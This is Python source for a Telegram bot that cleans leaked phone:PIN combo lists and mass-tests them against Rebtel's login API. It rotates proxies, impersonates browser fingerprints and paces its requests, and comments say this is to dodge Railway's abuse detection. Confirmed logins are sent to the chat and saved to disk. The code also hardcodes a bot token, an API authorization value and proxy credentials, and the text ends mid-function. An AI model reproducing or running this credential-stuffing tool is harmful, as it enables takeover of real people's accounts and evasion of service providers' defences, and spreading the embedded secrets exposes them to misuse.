"""
Rebtel Telegram Bot
===================
Combines the Rebtel combo cleaner (rebcleaner.py) and the Rebtel authentication
checker (rebtel.py) behind a single Telegram bot.

Commands
--------
- /clean      (reply to a .txt file)            -> cleans combos, sends cleaned file back
- /check [N]  (reply to a .txt file)           -> runs the checker with N threads (default 10)
                                                  edits a live status message, alerts each
                                                  hit immediately and uploads hits.txt at the end
- /stop                                          -> stops the running /check for this chat
- /setpr      (reply to a .txt file OR args)    -> REPLACES the proxy pool. Parses many formats,
                                                  validates each proxy against the validation
                                                  URL (default: ipify) and adds it to the pool
                                                  AS SOON AS it passes (streaming). If nothing
                                                  works, the old pool is kept. Pool persists to disk.
                                                  Append "raw" to skip validation entirely:
                                                  /setpr raw  (recommended on Railway to avoid
                                                  "unusual network activity" bans).
- /addpr      (reply to a .txt file OR args)    -> ADDS working proxies to the pool (streaming,
                                                  with persistence). /addpr raw also supported.
- /clearpr                                       -> empties the proxy pool (and clears the file)
- /listpr                                        -> shows how many proxies are in the pool
- /start  /help                                  -> help text

The proxy pool is shared across all users (multi-user bot).

Proxy input formats accepted (one per line):
  host:port
  host:port:username:password        (e.g. p101.squidproxies.com:9014:1316:p8zishJyoWbr)
  username:password@host:port
  http://host:port
  http://username:password@host:port
  https://host:port
  socks5://host:port
  socks4://host:port

When /setpr is replied to a file, the proxy scheme is also inferred from the file
name (e.g. "...socks5..." -> socks5://, "...http..." -> http://).
"""

import asyncio
import concurrent.futures
import io
import json
import os
import random
import re
import sys
import threading
import time
from datetime import datetime, UTC
from typing import List, Optional, Tuple

from telegram import Update, InputFile
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("curl_cffi is required. Install it with:  pip install curl_cffi")
    sys.exit(1)


# --------------------------------------------------------------------------- #
#  Console logging (colors, thread-safe)
# --------------------------------------------------------------------------- #
if sys.platform == "win32":
    os.system("color")
    try:
        import ctypes
        _kernel32 = ctypes.windll.kernel32
        _kernel32.SetConsoleMode(_kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass


class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


print_lock = threading.Lock()


def clog(*args, **kwargs):
    """Thread-safe print to console."""
    with print_lock:
        print(*args, **kwargs)


# --------------------------------------------------------------------------- #
#  Configuration
# --------------------------------------------------------------------------- #
BOT_TOKEN = "7993577146:AAGktkZBUSh9BfJD0-3-nu31u-osaebM8zM"
DEFAULT_THREADS = 10
MAX_THREADS = 100
PROXY_VALIDATE_TIMEOUT = 12
# Low concurrency + per-request delay keeps Railway's abuse detection happy.
# (40 workers hammering one site with 2k requests is what got the project banned.)
# Defaults below are tuned for ipify (neutral endpoint) so we can push harder
# without tripping Railway's "unusual network activity" sensor.
PROXY_VALIDATE_WORKERS = int(os.environ.get("PROXY_VALIDATE_WORKERS", "25"))
PROXY_VALIDATE_DELAY_MIN = float(os.environ.get("PROXY_VALIDATE_DELAY_MIN", "0.0"))
PROXY_VALIDATE_DELAY_MAX = float(os.environ.get("PROXY_VALIDATE_DELAY_MAX", "0.0"))
STATUS_EDIT_MIN_INTERVAL = 2.5          # seconds between status-message edits
REBTEL_HOME = "https://my.rebtel.com/"
REBTEL_AUTH_URL = "https://userapi.rebtel.com/v2/users/number/{phone}/authentication"
REBTEL_AUTH_HEADER = "application 7443a5f6-01a7-4ce7-8e87-c36212fad4f5"

# Lightweight, neutral endpoint used to validate proxies. ipify returns your
# outbound IP as plain text -- exactly what proxy-checkers need, and it won't
# trip Railway's abuse detection the way hammering my.rebtel.com 2k times does.
# Set PROXY_VALIDATE_URL=https://my.rebtel.com/ in env to use the Rebtel target.
PROXY_VALIDATE_URL = os.environ.get("PROXY_VALIDATE_URL", "https://api.ipify.org?format=json")

# If "1", /check will NOT batch-reverify the whole pool before running. Dead
# proxies then get filtered naturally during the check (retries + error drops).
# Batch-reverifying a 2k pool from Railway triggers "unusual network activity".
SKIP_POOL_REVERIFY = os.environ.get("SKIP_POOL_REVERIFY", "1") == "1"

# Persistent shared proxy pool. One proxy URL per line. Survives restarts.
# On Railway (or any container host) you can mount a Volume at /app/data and
# set PROXY_POOL_DIR=/app/data so the pool survives redeployments.
_pool_dir = os.environ.get("PROXY_POOL_DIR") or os.path.dirname(os.path.abspath(__file__))
PROXY_POOL_FILE = os.path.join(_pool_dir, "proxy_pool.txt")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]
BROWSER_IMPERSONATIONS = [
    "chrome120", "chrome119", "chrome110", "chrome107", "edge101", "safari15_5",
]


# --------------------------------------------------------------------------- #
#  Combo cleaner  (ported from rebcleaner.py)
# --------------------------------------------------------------------------- #
def clean_phone_number(phone_part: str) -> Optional[str]:
    if phone_part.startswith("+"):
        phone_part = phone_part[1:]
    parts = phone_part.split(":")
    cleaned_parts = []
    for part in parts:
        digits = re.sub(r"[^\d]", "", part)
        if digits:
            cleaned_parts.append(digits)
    full_number = "".join(cleaned_parts)
    if full_number:
        return "+" + full_number
    return None


URL_PATTERNS = [
    r"^https?://[^:]+:",
    r"^[a-zA-Z]+\.[a-zA-Z]+\.[a-zA-Z]+/[^:]*:",
    r"^[a-zA-Z]+\.[a-zA-Z]+\.[a-zA-Z]+:",
    r"^www\.[^:]+:",
    r"^[a-zA-Z]+\.[a-zA-Z]+/[^:]*:",
    r"^[a-zA-Z]+\.[a-zA-Z]+:",
]


def extract_combo_from_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line:
        return None
    for pattern in URL_PATTERNS:
        line = re.sub(pattern, "", line)
    if "@" in line.split(":")[0]:
        return None
    if "ENC" in line or "MDo" in line:
        return None
    first_part = line.split(":")[0].lstrip("+")
    if first_part and not first_part[0].isdigit():
        return None
    parts = line.split(":")
    if len(parts) < 2:
        return None
    if len(parts) == 2:
        phone, pin = parts
        if not pin.isdigit():
            return None
        cleaned_phone = clean_phone_number(phone)
        if cleaned_phone and len(cleaned_phone) > 5:
            return f"{cleaned_phone}:{pin}"
        return None
    password = parts[-1]
    if not password or not password.isdigit():
        return None
    phone_candidate = ":".join(parts[:-1])
    cleaned_phone = clean_phone_number(phone_candidate)
    if cleaned_phone:
        digits_only = re.sub(r"[^\d]", "", cleaned_phone)
        if len(digits_only) >= 7:
            return f"{cleaned_phone}:{password}"
    return None


def clean_lines(lines: List[str]) -> Tuple[List[str], int, int]:
    valid_combos: List[str] = []
    seen = set()
    invalid = 0
    for line in lines:
        combo = extract_combo_from_line(line)
        if combo and combo not in seen:
            seen.add(combo)
            valid_combos.append(combo)
        else:
            invalid += 1
    return valid_combos, len(valid_combos), invalid


# --------------------------------------------------------------------------- #
#  Proxy parsing
# --------------------------------------------------------------------------- #
def normalize_proxy(raw: str, scheme_hint: str = "http") -> Optional[str]:
    """Return a proxy URL ready for curl_cffi, or None if unparseable."""
    raw = raw.strip()
    if not raw:
        return None
    # Already has an explicit scheme.
    m = re.match(r"^(https?|socks4|socks5)://", raw, re.I)
    if m:
        return raw
    # user:pass@host:port
    if "@" in raw:
        return f"{scheme_hint}://{raw}"
    parts = raw.split(":")
    if len(parts) == 2:
        host, port = parts
        return f"{scheme_hint}://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pw = parts
        return f"{scheme_hint}://{user}:{pw}@{host}:{port}"
    if len(parts) == 3:
        # ambiguous - treat first as host, second as port, third as user with empty password? skip.
        return None
    return None


def scheme_from_filename(filename: Optional[str]) -> str:
    fn = (filename or "").lower()
    if "socks5" in fn or "socks 5" in fn:
        return "socks5"
    if "socks4" in fn:
        return "socks4"
    if "https" in fn:
        return "https"
    return "http"


def parse_proxy_text(text: str, scheme_hint: str = "http") -> List[str]:
    out: List[str] = []
    for line in text.splitlines():
        p = normalize_proxy(line, scheme_hint)
        if p:
            out.append(p)
    return out


# --------------------------------------------------------------------------- #
#  ProxyManager  (shared global pool)
# --------------------------------------------------------------------------- #
class ProxyManager:
    """Thread-safe, disk-persisted proxy pool (shared across all chats)."""

    def __init__(self, pool_file: str = PROXY_POOL_FILE) -> None:
        self.working_proxies: List[str] = []
        self.lock = threading.Lock()
        self.pool_file = pool_file
        self.load()

    # ---- persistence ----
    def load(self) -> int:
        """Load the pool from disk. Called at startup."""
        try:
            with open(self.pool_file, "r", encoding="utf-8") as fh:
                lines = [ln.strip() for ln in fh if ln.strip()]
            with self.lock:
                self.working_proxies = lines
            return len(lines)
        except FileNotFoundError:
            return 0
        except Exception:
            return 0

    def _save(self) -> None:
        """Persist the current pool to disk. Caller must hold self.lock."""
        try:
            tmp = self.pool_file + ".tmp"
            with open(tmp, "w", encoding="utf-8") as fh:
                for p in self.working_proxies:
                    fh.write(p + "\n")
            os.replace(tmp, self.pool_file)
        except Exception:
            pass

    # ---- queries ----
    def count(self) -> int:
        with self.lock:
            return len(self.working_proxies)

    def get_all(self) -> List[str]:
        with self.lock:
            return list(self.working_proxies)

    # ---- mutations ----
    def replace(self, proxies: List[str]) -> None:
        with self.lock:
            self.working_proxies = list(proxies)
            self._save()

    def add_one(self, proxy: str) -> bool:
        """Add a single proxy immediately and persist. Returns True if new."""
        with self.lock:
            if proxy in self.working_proxies:
                return False
            self.working_proxies.append(proxy)
            self._save()
            return True

    def add(self, proxies: List[str]) -> int:
        with self.lock:
            existing = set(self.working_proxies)
            added = 0
            for p in proxies:
                if p not in existing:
                    self.working_proxies.append(p)
                    existing.add(p)
                    added += 1
            if added:
                self._save()
            return added

    def clear(self) -> int:
        with self.lock:
            n = len(self.working_proxies)
            self.working_proxies = []
            self._save()
            return n

    def remove(self, proxy: str) -> None:
        with self.lock:
            if proxy in self.working_proxies:
                self.working_proxies.remove(proxy)
                self._save()

    def get_next_proxy(self, idx_holder: List[int]) -> Optional[str]:
        with self.lock:
            if not self.working_proxies:
                return None
            idx = idx_holder[0] % len(self.working_proxies)
            proxy = self.working_proxies[idx]
            idx_holder[0] = (idx + 1) % len(self.working_proxies)
            return proxy


proxy_manager = ProxyManager()


def validate_proxy(proxy_url: str, label: str = "") -> bool:
    """Return True if the proxy can fetch PROXY_VALIDATE_URL (default: ipify)."""
    # Optional pacing; skipped entirely when DELAY_MAX is 0 (the fast default).
    if PROXY_VALIDATE_DELAY_MAX > 0:
        time.sleep(random.uniform(PROXY_VALIDATE_DELAY_MIN, PROXY_VALIDATE_DELAY_MAX))
    try:
        browser = random.choice(BROWSER_IMPERSONATIONS)
        resp = cffi_requests.get(
            PROXY_VALIDATE_URL,
            proxy=proxy_url,
            timeout=PROXY_VALIDATE_TIMEOUT,
            impersonate=browser,
        )
        ok = resp.status_code == 200
        if label:
            tag = f"{Colors.GREEN}OK{Colors.RESET}" if ok else f"{Colors.RED}FAIL (HTTP {resp.status_code}){Colors.RESET}"
            clog(f"[proxy] {label} {tag}  {proxy_url}")
        return ok
    except Exception as e:
        if label:
            msg = str(e)[:60] + ("..." if len(str(e)) > 60 else "")
            clog(f"[proxy] {label} {Colors.RED}ERR{Colors.RESET} ({msg})  {proxy_url}")
        return False


def validate_proxies(
    proxies: List[str],
    progress_cb=None,
    on_success=None,
    cancel_event: Optional[threading.Event] = None,
) -> List[str]:
    """Validate a list of proxy URLs concurrently.

    Returns the list of working proxies. If ``on_success`` is provided, it is
    called with each working proxy URL the moment it is confirmed to work,
    so callers can stream proxies into the pool as validation progresses
    instead of waiting for the whole batch to finish.
    """
    if not proxies:
        return []
    working: List[str] = []
    lock = threading.Lock()
    completed = [0]
    total = len(proxies)

    def check(p: str) -> None:
        if cancel_event is not None and cancel_event.is_set():
            return
        with lock:
            idx = completed[0] + 1
        label = f"[{idx}/{total}]"
        ok = validate_proxy(p, label=label)
        with lock:
            completed[0] += 1
            if ok:
                working.append(p)
                if on_success is not None:
                    try:
                        on_success(p)
                    except Exception:
                        pass
            if progress_cb is not None:
                try:
                    progress_cb(completed[0], total, len(working))
                except Exception:
                    pass

    workers = min(PROXY_VALIDATE_WORKERS, len(proxies))
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(check, p) for p in proxies]
        for f in concurrent.futures.as_completed(futs):
            pass
    return working


# --------------------------------------------------------------------------- #
#  Rebtel authentication checker (ported from rebtel.py, sync/threaded)
# --------------------------------------------------------------------------- #
HITS_FILENAME = "hits_{chat_id}.txt"


class CheckJob:
    """State for a single /check run, tied to a chat."""

    def __init__(self, chat_id: int, total: int, status_msg_id: int, threads: int) -> None:
        self.chat_id = chat_id
        self.total = total
        self.status_msg_id = status_msg_id
        self.threads = threads
        self.stop_event = threading.Event()
        self.checked = 0
        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.last_edit = 0.0
        self.hits_lines: List[str] = []        # raw text for the final hits.txt
        self.checked_combos: List[Tuple[str, str]] = []
        self.use_proxy = proxy_manager.count() > 0
        self.proxy_idx = [0]
        self.hits_filename = HITS_FILENAME.format(chat_id=chat_id)
        # also persist hits on disk in real time, so a crash never loses them.
        try:
            open(self.hits_filename, "w", encoding="utf-8").close()
        except Exception:
            pass

    def should_stop(self) -> bool:
        return self.stop_event.is_set()


# Per-chat active jobs so /stop only stops the caller's run.
active_jobs: dict[int, CheckJob] = {}
active_jobs_lock = threading.Lock()


def _format_eta(seconds: float) -> str:
    if seconds < 60:
        return f"{int(seconds)}s"
    if seconds < 3600:
        return f"{int(seconds // 60)}m {int(seconds % 60)}s"
    return f"{int(seconds // 3600)}h {int((seconds % 3600) // 60)}m"


def status_text(job: CheckJob) -> str:
    elapsed = time.time() - job.start_time
    rate = job.checked / elapsed if elapsed > 0 else 0.0
    remaining = (job.total - job.checked) / rate if rate > 0 else 0
    pct = (job.checked / job.total * 100) if job.total else 0.0
    filled = int(20 * job.checked / job.total) if job.total else 0
    bar = "#" * filled + "-" * (20 - filled)
    proxy_mode = "Proxy" if job.use_proxy else "Proxyless"
    return (
        f"`[{bar}] {pct:.1f}%`\n"
        f"Mode: {proxy_mode}  Threads: {job.threads}\n"
        f"Checked: {job.checked}/{job.total}\n"
        f"Hits: {job.hits}  Fails: {job.fails}  Errors: {job.errors}\n"
        f"Rate: {rate:.1f}/s  ETA: {_format_eta(remaining)}"
    )


# --------------------------------------------------------------------------- #
#  Telegram glue
# --------------------------------------------------------------------------- #
LOOP: Optional[asyncio.AbstractEventLoop] = None


async def post_init(app: Application) -> None:
    global LOOP
    LOOP = asyncio.get_running_loop()


def _threadsafe_send(coro):
    """Schedule a coroutine on the bot's event loop from a worker thread."""
    if LOOP is None:
        return
    asyncio.run_coroutine_threadsafe(coro, LOOP)


async def _safe_edit_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, msg_id: int, text: str):
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id, text=text, parse_mode=ParseMode.MARKDOWN
        )
    except Exception:
        pass


async def _safe_send_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str):
    try:
        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass


async def _safe_send_document(context: ContextTypes.DEFAULT_TYPE, chat_id: int, file_bytes: bytes, filename: str, caption: str = ""):
    try:
        bio = io.BytesIO(file_bytes)
        bio.name = filename
        await context.bot.send_document(chat_id=chat_id, document=InputFile(bio, filename=filename), caption=caption)
    except Exception as e:
        try:
            await context.bot.send_message(chat_id=chat_id, text=f"Failed to send file: {e}")
        except Exception:
            pass


# --------------------------------------------------------------------------- #
#  /start  /help
# --------------------------------------------------------------------------- #
HELP_TEXT = (
    "*Rebtel Bot*\n\n"
    "*Cleaning*\n"
    "Reply `/clean` to a `.txt` file of raw combos -> returns a cleaned, de-duplicated file.\n\n"
    "*Checking*\n"
    "Reply `/check [threads]` to a `.txt` file of `phone:pin` combos -> runs the Rebtel "
    "auth checker. Default threads = 10. While running, a status message updates live and "
    "every hit is sent to this chat immediately. When finished, `hits.txt` is uploaded.\n"
    "Use `/stop` to cancel the running check for this chat.\n\n"
    "*Proxies (shared pool, persisted to disk)*\n"
    "/setpr - reply to a .txt file OR pass proxies as args. Validates each proxy "
    "(default endpoint: ipify) and REPLACES the pool, streaming working proxies in "
    "*as they pass*. If nothing works, the old pool is restored.\n"
    "Append `raw` to skip validation entirely: `/setpr raw` (recommended on Railway "
    "to avoid \"unusual network activity\" bans).\n"
    "/addpr - same, but ADDS working proxies to the pool instead of replacing it. "
    "`/addpr raw` also supported.\n"
    "/check - re-verifies the pool before checking (disable with env "
    "SKIP_POOL_REVERIFY=1, which is the default). Dead proxies drop out naturally "
    "during the check via retries.\n"
    "/clearpr - empty the pool (and clears the saved file).\n"
    "/listpr - show pool size.\n\n"
    "Accepted proxy formats (one per line):\n"
    "`host:port`\n"
    "`host:port:user:pass`\n"
    "`user:pass@host:port`\n"
    "`http://host:port`  /  `http://user:pass@host:port`\n"
    "`https://host:port`  /  `socks5://host:port`  /  `socks4://host:port`"
)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(HELP_TEXT, parse_mode=ParseMode.MARKDOWN)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(HELP_TEXT, parse_mode=ParseMode.MARKDOWN)


# --------------------------------------------------------------------------- #
#  Helpers for downloading / parsing replied files
# --------------------------------------------------------------------------- #
async def download_replied_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Tuple[Optional[bytes], Optional[str]]:
    """Download the file the user replied to. Returns (content, filename) or (None, None)."""
    msg = update.message
    if msg is None or msg.reply_to_message is None:
        return None, None
    doc = msg.reply_to_message.document
    if doc is None:
        # Maybe it's a text message instead of a file.
        if msg.reply_to_message.text:
            return msg.reply_to_message.text.encode("utf-8", "ignore"), None
        return None, None
    tg_file = await doc.get_file()
    data = await tg_file.download_as_bytearray()
    return bytes(data), doc.file_name


# --------------------------------------------------------------------------- #
#  /clean
# --------------------------------------------------------------------------- #
async def cmd_clean(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.message
    if msg is None or msg.reply_to_message is None:
        await msg.reply_text("Reply `/clean` to a `.txt` file of raw combos.", parse_mode=ParseMode.MARKDOWN)
        return
    clog(f"[cmd] /clean from chat={msg.chat_id} user={update.effective_user}")
    data, filename = await download_replied_file(update, context)
    if data is None:
        await msg.reply_text("Could not download a file from the replied message.")
        return
    try:
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        await msg.reply_text(f"Could not decode file: {e}")
        return
    lines = text.splitlines()
    combos, valid_count, invalid_count = clean_lines(lines)

    original_name = filename or "combos.txt"
    base, _ = os.path.splitext(original_name)
    out_name = f"cleaned_{base}.txt"
    content = "\n".join(combos) + ("\n" if combos else "")
    bio = io.BytesIO(content.encode("utf-8"))
    bio.name = out_name
    caption = (
        f"Cleaning done.\n"
        f"Original lines: {len(lines)}\n"
        f"Valid combos: {valid_count}\n"
        f"Removed (invalid/dupes): {invalid_count}"
    )
    await msg.reply_document(document=InputFile(bio, filename=out_name), caption=caption)


# --------------------------------------------------------------------------- #
#  /setpr  /addpr
# --------------------------------------------------------------------------- #
async def _collect_proxy_candidates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Tuple[List[str], Optional[str], bool]:
    """Return (candidates, scheme_hint, raw_flag).  raw=True when the user
    passed 'raw' as the first arg (e.g. /setpr raw) -> skip validation."""
    msg = update.message
    raw = False
    args = list(context.args or [])
    if args and args[0].lower() == "raw":
        raw = True
        args = args[1:]

    # Case 1: reply to a file.
    if msg.reply_to_message is not None:
        data, filename = await download_replied_file(update, context)
        if data is not None:
            text = data.decode("utf-8", errors="ignore")
            hint = scheme_from_filename(filename)
            return parse_proxy_text(text, hint), None, raw
    # Case 2: args on the command line (could be multi-line).
    if args:
        blob = "\n".join(args)
        return parse_proxy_text(blob, "http"), None, raw
    # Case 3: if the replied message had text proxies.
    if msg.reply_to_message is not None and msg.reply_to_message.text:
        return parse_proxy_text(msg.reply_to_message.text, "http"), None, raw
    return [], None, raw


async def _do_setpr(update: Update, context: ContextTypes.DEFAULT_TYPE, add: bool) -> None:
    msg = update.message
    cmd_name = "/addpr" if add else "/setpr"
    clog(f"[cmd] {cmd_name} from chat={msg.chat_id} user={update.effective_user}")
    status = await msg.reply_text("Collecting candidate proxies...")
    candidates, _, raw = await _collect_proxy_candidates(update, context)
    if not candidates:
        await status.edit_text(
            "No proxy candidates found.\n"
            "Reply `/setpr` to a `.txt` file of proxies (any format), "
            "or pass them as args, e.g.:\n"
            "`/setpr p101.squidproxies.com:9014:1316:p8zishJyoWbr`\n\n"
            "Add `raw` to skip validation: `/setpr raw` (recommended on Railway).",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    # de-duplicate candidates
    seen = set()
    uniq = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    candidates = uniq

    if raw:
        # ---- raw mode: parse and add to the pool without any validation ----
        if not add:
            proxy_manager.clear()
        added = proxy_manager.add(candidates)
        final_pool = proxy_manager.count()
        clog(f"[setpr] raw mode: parsed {len(candidates)} -> added {added}, pool now {final_pool}")
        await status.edit_text(
            f"*Raw mode* (no validation).\n"
            f"Parsed: {len(candidates)}  Added: {added} (dupes skipped)\n"
            f"Pool size now: {final_pool}",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # For /setpr (replace mode), remember the old pool so we can restore it if
    # nothing works. We wipe the pool *before* validation begins so that we can
    # stream wins in immediately; if nothing passes, we restore the old pool.
    if not add:
        old_pool = proxy_manager.get_all()
        proxy_manager.clear()

    await status.edit_text(
        f"Validating {len(candidates)} proxies against `{PROXY_VALIDATE_URL}` ...\n"
        f"({PROXY_VALIDATE_WORKERS} workers, gentle pacing)\n"
        f"(proxies are added to the pool as soon as they pass)",
        parse_mode=ParseMode.MARKDOWN,
    )

    state = {"done": 0, "working": 0, "last_t": 0.0}

    def on_success(proxy_url: str) -> None:
        # Stream this proxy into the pool immediately and persist.
        proxy_manager.add_one(proxy_url)

    def progress(done, total, working):
        state["done"] = done
        state["working"] = working
        now = time.time()
        if now - state["last_t"] >= STATUS_EDIT_MIN_INTERVAL:
            state["last_t"] = now
            _threadsafe_send(_safe_edit_message(
                context,
                msg.chat_id,
                status.message_id,
                f"Validating proxies ... `{working}` working / `{done}`/`{total}` checked\n"
                f"Pool size now: {proxy_manager.count()}",
            ))

    loop = asyncio.get_running_loop()
    await loop.run_in_executor(
        None,
        lambda: validate_proxies(candidates, progress_cb=progress, on_success=on_success),
    )

    done = state["done"]
    working_n = state["working"]
    final_pool = proxy_manager.count()

    if not add and working_n == 0:
        # Nothing passed -> restore the old pool so we don't leave the user naked.
        if old_pool:
            proxy_manager.replace(old_pool)
            final_pool = proxy_manager.count()
            text = (
                f"Validation done. *0* proxies worked out of {len(candidates)}.\n"
                f"Old pool restored ({final_pool} proxies kept)."
            )
        else:
            text = (
                f"Validation done. *0* proxies worked out of {len(candidates)}.\n"
                f"Pool is empty."
            )
    else:
        verb = "added to" if add else "replaced in"
        text = (
            f"Validation done.\n"
            f"Candidates: {len(candidates)}  Checked: {done}\n"
            f"Working: {working_n}  -> {verb} pool (streamed in real time)\n"
            f"Pool size now: {final_pool}"
        )
    await status.edit_text(text, parse_mode=ParseMode.MARKDOWN)


async def cmd_setpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await _do_setpr(update, context, add=False)


async def cmd_addpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await _do_setpr(update, context, add=True)


async def cmd_clearpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    n = proxy_manager.clear()
    clog(f"[cmd] /clearpr from chat={update.message.chat_id} user={update.effective_user} -> cleared {n}")
    await update.message.reply_text(f"Cleared proxy pool ({n} proxies removed).")


async def cmd_listpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    n = proxy_manager.count()
    clog(f"[cmd] /listpr from chat={update.message.chat_id} -> pool size {n}")
    await update.message.reply_text(f"Proxy pool size: *{n}*", parse_mode=ParseMode.MARKDOWN)


# --------------------------------------------------------------------------- #
#  /check
# --------------------------------------------------------------------------- #
def read_combos(text: str) -> List[Tuple[str, str]]:
    combos = []
    for line in text.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        parts = line.split(":", 1)
        if len(parts) == 2:
            phone = parts[0].strip()
            pin = parts[1].strip()
            if phone and pin:
                combos.append((phone, pin))
    return combos


def send_authentication_request(
    phone: str, pin: str, attempt: int, job: CheckJob, context: ContextTypes.DEFAULT_TYPE
) -> str:
    if job.should_stop():
        return "stopped"
    browser = random.choice(BROWSER_IMPERSONATIONS)
    user_agent = random.choice(USER_AGENTS)

    proxy = None
    if job.use_proxy:
        proxy = proxy_manager.get_next_proxy(job.proxy_idx)
        if proxy is None:
            job.use_proxy = False

    if job.should_stop():
        return "stopped"

    delay = random.uniform(2, 5) if attempt == 1 else random.uniform(5, 10)
    time.sleep(delay)
    if job.should_stop():
        return "stopped"

    current_time = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Authorization": REBTEL_AUTH_HEADER,
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://my.rebtel.com",
        "Referer": "https://my.rebtel.com/",
        "User-Agent": user_agent,
        "X-Timestamp": current_time,
    }
    json_data = {"password": pin, "voucher": None}

    proxy_short = (proxy or "direct").split("@")[-1] if proxy else "direct"

    try:
        session = cffi_requests.Session()
        try:
            session.get(
                REBTEL_HOME,
                headers={"User-Agent": user_agent},
                proxy=proxy,
                timeout=15,
                impersonate=browser,
            )
            time.sleep(random.uniform(1, 3))
        except Exception:
            pass
        if job.should_stop():
            return "stopped"

        response = session.post(
            REBTEL_AUTH_URL.format(phone=phone),
            headers=headers,
            json=json_data,
            proxy=proxy,
            timeout=30,
            impersonate=browser,
        )

        # ---- console log (every request) ----
        retryable = response.status_code in (403, 429, 500, 502, 503, 504)
        if response.status_code == 200:
            status_color = Colors.GREEN + "200 HIT" + Colors.RESET
        elif retryable:
            status_color = Colors.YELLOW + f"{response.status_code} RETRY" + Colors.RESET
        else:
            status_color = Colors.RED + f"{response.status_code} FAIL" + Colors.RESET
        clog(
            f"[chk {job.chat_id}] {phone}:{pin}  "
            f"status={status_color}  attempt={attempt}  via={proxy_short}  ({browser})"
        )

        if response.status_code == 200:
            # HIT
            body_raw = response.text
            try:
                body_json = response.json()
                body_pretty = json.dumps(body_json, indent=2)
            except Exception:
                body_pretty = body_raw
            clog(f"{Colors.GREEN}{'='*50}{Colors.RESET}")
            clog(f"{Colors.GREEN}HIT! Phone: {phone}  PIN: {pin}{Colors.RESET}")
            clog(body_pretty)
            clog(f"{Colors.GREEN}{'='*50}{Colors.RESET}")
            record = (
                f"{'='*50}\n"
                f"SUCCESS - {datetime.now()}\n"
                f"Phone: {phone}\n"
                f"Password: {pin}\n"
                f"Response: {body_pretty}\n"
                f"{'='*50}\n\n"
            )
            with job.lock:
                job.hits += 1
                job.checked += 1
                job.hits_lines.append(f"{phone}:{pin}")
                # persist on disk
                try:
                    with open(job.hits_filename, "a", encoding="utf-8") as fh:
                        fh.write(record)
                except Exception:
                    pass
            _threadsafe_send(_safe_send_message(
                context,
                job.chat_id,
                f"*HIT* `{phone}:{pin}`\nStatus: 200\n```{body_pretty[:1500]}```",
            ))
            _maybe_edit_status(job, context)
            return "hit"
        else:
            # Non-hit. Show response body (truncated).
            body_preview = response.text[:200].replace("\n", " ")
            clog(f"  resp: {body_preview}")
            with job.lock:
                job.checked += 1
                if retryable:
                    job.errors += 1
                else:
                    job.fails += 1
            _maybe_edit_status(job, context)
            if retryable and attempt < 3:
                time.sleep(random.uniform(5, 10))
                if job.should_stop():
                    return "stopped"
                return send_authentication_request(phone, pin, attempt + 1, job, context)
            return "fail"
    except Exception as e:
        msg = str(e)[:80] + ("..." if len(str(e)) > 80 else "")
        clog(
            f"{Colors.YELLOW}[chk {job.chat_id}] {phone}:{pin}  "
            f"ERROR attempt={attempt} via={proxy_short}: {msg}{Colors.RESET}"
        )
        with job.lock:
            job.checked += 1
            job.errors += 1
        _maybe_edit_status(job, context)
        if attempt < 3 and not job.should_stop():
            time.sleep(random.uniform(3, 6))
            if job.should_stop():
                return "stopped"
            return send_authentication_request(phone, pin, attempt + 1, job, context)
        return "error"


def _maybe_edit_status(job: CheckJob, context: ContextTypes.DEFAULT_TYPE) -> None:
    now = time.time()
    with job.lock:
